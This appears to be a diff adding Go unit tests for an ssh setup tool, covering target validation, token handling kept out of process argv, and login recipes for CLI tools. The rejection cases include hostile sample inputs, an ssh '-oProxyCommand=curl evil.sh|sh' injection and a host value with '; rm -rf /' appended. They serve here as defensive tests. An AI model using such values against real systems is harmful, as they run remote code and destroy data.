@@ -1,0 +1,118 @@
+package setuptool
+
+import (
+	"errors"
+	"os"
+	"strings"
+	"testing"
+)
+
+func TestNewTargetDefaultsToRoot(t *testing.T) {
+	tg, err := NewTarget("203.0.113.9", "")
+	if err != nil {
+		t.Fatalf("NewTarget: %v", err)
+	}
+	if tg.String() != "root@203.0.113.9" {
+		t.Errorf("String() = %q, want root@203.0.113.9", tg.String())
+	}
+}
+
+// ssh has no "--" sentinel, so a host or user beginning with "-" is parsed as
+// an option and -oProxyCommand=<cmd> executes <cmd> on the local machine.
+func TestNewTargetRejectsOptionShapedValues(t *testing.T) {
+	for _, tc := range []struct{ host, user string }{
+		{"-oProxyCommand=curl evil.sh|sh", "root"},
+		{"203.0.113.9", "-oProxyCommand=x"},
+		{"203.0.113.9; rm -rf /", "root"},
+		{"203.0.113.9", "ro ot"},
+		{"", "root"},
+		{"2001:db8::1", "root"},
+	} {
+		if _, err := NewTarget(tc.host, tc.user); !errors.Is(err, ErrUnsafeTarget) {
+			t.Errorf("NewTarget(%q,%q) err = %v, want ErrUnsafeTarget", tc.host, tc.user, err)
+		}
+	}
+}
+
+func TestUploadRejectsOptionShapedPaths(t *testing.T) {
+	tg, _ := NewTarget("203.0.113.9", "root")
+	for _, tc := range [][2]string{{"-local", "/tmp/x"}, {"/tmp/x", "-remote"}} {
+		if err := Upload(tg, tc[0], tc[1]); !errors.Is(err, ErrUnsafeTarget) {
+			t.Errorf("Upload(%q,%q) err = %v, want ErrUnsafeTarget", tc[0], tc[1], err)
+		}
+	}
+}
+
+// A token in argv is visible in the box's process table to every other user.
+// Every login recipe must consume it from stdin instead.
+func TestNoLoginRecipePutsTheTokenInArgv(t *testing.T) {
+	// login() takes no arguments, so it cannot interpolate a Go value — the
+	// signature is the real guarantee. What remains checkable is that each
+	// recipe actually consumes stdin, and that the token never reaches the
+	// argv of an external process (shell builtins like printf are fine: they
+	// fork nothing and appear in no process table).
+	external := []string{"echo ", "/usr/bin/printf", "curl ", "wget "}
+	for _, tool := range SupportedTools() {
+		cmd := tool.login()
+		readsStdin := strings.Contains(cmd, "$(cat)") ||
+			strings.Contains(cmd, "--with-token") ||
+			strings.HasSuffix(strings.TrimSpace(cmd), "cat")
+		if !readsStdin {
+			t.Errorf("%s: login command does not consume stdin, so the token must be arriving another way: %q", tool.Name, cmd)
+		}
+		for _, e := range external {
+			if strings.Contains(cmd, e+`"$TOKEN"`) {
+				t.Errorf("%s: passes the token to %q, which forks a process and exposes it in the process table: %q", tool.Name, e, cmd)
+			}
+		}
+	}
+}
+
+func TestEveryToolCanBeVerifiedAndPointsSomewhereToGetAToken(t *testing.T) {
+	for _, tool := range SupportedTools() {
+		if tool.verify == "" {
+			t.Errorf("%s: no verify command — a bad token would look like success", tool.Name)
+		}
+		if !strings.HasPrefix(tool.TokenURL, "https://") {
+			t.Errorf("%s: TokenURL = %q, want an https URL to send the user to", tool.Name, tool.TokenURL)
+		}
+		if tool.Help == "" {
+			t.Errorf("%s: no Help — the prompt would not say what the token is for", tool.Name)
+		}
+	}
+}
+
+// Claude Code's subscription login is an interactive browser OAuth with no
+// token path, so it must not appear in a list that promises token auth.
+func TestClaudeIsNotOfferedAsATokenLogin(t *testing.T) {
+	for _, tool := range SupportedTools() {
+		if strings.Contains(strings.ToLower(tool.Name), "claude") {
+			t.Errorf("%q is listed as token-authenticatable, but subscription login is browser OAuth", tool.Name)
+		}
+	}
+}
+
+func TestAuthenticateRejectsEmptyAndMultilineTokens(t *testing.T) {
+	tg, _ := NewTarget("203.0.113.9", "root")
+	tool := SupportedTools()[0]
+	for _, bad := range []string{"", "   ", "abc\ndef"} {
+		if err := Authenticate(tg, tool, bad); err == nil {
+			t.Errorf("Authenticate accepted %q", bad)
+		}
+	}
+}
+
+func TestTokenFromEnvFindsTheUsualNames(t *testing.T) {
+	tools := map[string]string{"github": "GH_TOKEN", "vercel": "VERCEL_TOKEN", "supabase": "SUPABASE_ACCESS_TOKEN"}
+	for _, tool := range SupportedTools() {
+		key := tools[tool.Name]
+		if key == "" {
+			t.Fatalf("test does not know an env var for %q", tool.Name)
+		}
+		t.Setenv(key, "tok-"+tool.Name)
+		if got := TokenFromEnv(tool); got != "tok-"+tool.Name {
+			t.Errorf("TokenFromEnv(%s) = %q, want the value of %s", tool.Name, got, key)
+		}
+		os.Unsetenv(key)
+	}
+}
